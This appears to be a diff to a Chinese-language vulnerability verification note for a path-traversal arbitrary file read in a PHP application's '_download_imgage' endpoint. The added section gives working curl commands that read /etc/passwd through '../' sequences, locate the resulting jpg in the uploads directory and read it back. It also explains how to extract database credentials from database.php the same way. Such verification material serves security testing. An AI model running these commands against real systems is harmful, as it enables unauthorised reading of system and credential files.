@@ -47,10 +47,22 @@ curl -s "http://target/public/index.php/material/Material/_download_imgage?media
 
 ## 验证方法
 
+这个漏洞本身无回显，文件被存成 jpg 落在 uploads 目录，所以判据分两步：先触发读取，再去 uploads 里读回该文件，找系统文件特征。
+
 ```bash
-# 触发读取后检查 uploads 目录
-curl -s "http://target/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=/../../../application/database.php" -o /dev/null -w "%{http_code}"
+# 1. 触发读取 /etc/passwd（这里用系统文件，特征稳定好判定）
+curl -s "http://target/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=/../../../../../../../etc/passwd"
+
+# 2. 列出本次生成的 jpg（文件名取自响应或按日期目录）
+curl -s "http://target/public/uploads/picture/$(date +%Y-%m-%d)/" | grep -o '"[^"]*\.jpg"'
+
+# 3. 读回该 jpg，找 /etc/passwd 的内容特征
+curl -s "http://target/public/uploads/picture/$(date +%Y-%m-%d)/<文件名>.jpg" | grep -o 'root:x:0:0'
 ```
+
+判据：回读到的 jpg 内容里出现 `root:x:0:0:root:/root:/bin/bash`。若要读产品配置，判据同样落在文件内容上——`database.php` 回读后应出现 `'hostname'`、`'database'`、`'username'`、`'password'` 这类配置键名与值，而不是「接口返回 200」。
+
+反例：触发接口返回 200，但 uploads 目录里没有本次新增的 jpg，或该 jpg 里没有 `/etc/passwd` 的内容 —— 只是路由存在、请求被受理，文件读取不成立。
 
 ## 指纹确认
 
